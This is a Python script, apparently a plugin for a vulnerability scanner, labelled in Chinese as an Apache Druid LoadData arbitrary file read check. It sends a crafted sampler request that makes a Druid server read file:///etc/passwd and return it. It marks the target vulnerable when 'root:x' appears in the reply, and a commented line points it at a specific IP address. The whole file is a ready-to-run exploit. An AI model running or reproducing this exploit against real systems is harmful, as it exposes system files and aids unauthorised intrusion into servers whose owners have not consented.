import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json,text/plain,*/*"
        }
        json_data = {
            "type": "index",
            "spec": {
                "type": "index",
                "ioConfig": {
                    "type": "index",
                    "inputSource": {
                        "type": "http",
                        "uris": [
                            "file:///etc/passwd"
                        ]
                    },
                    "inputFormat": {
                        "type": "regex",
                        "pattern": "(.*)",
                        "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
                        "columns": [
                            "raw"
                        ]
                    }
                },
                "dataSchema": {
                    "dataSource": "sample",
                    "timestampSpec": {
                        "column": "!!!_no_such_column_!!!",
                        "missingValue": "1970-01-01T00:00:00Z"
                    },
                    "dimensionsSpec": {
                    }
                },
                "tuningConfig": {
                    "type": "index"
                }
            },
            "samplerConfig": {
                "numRows": 500,
                "timeoutMs": 15000
            }
        }
        gf = requests.post(url+'druid/indexer/v1/sampler?for=connect',json=json_data,cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and 'root:x' in gf.text:
            uia = '[+]漏洞存在\ndruid/indexer/v1/sampler?for=connect\n'+gf.text
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://58.63.47.210:14430/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[ Apache Druid LoadData 任意文件读取 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)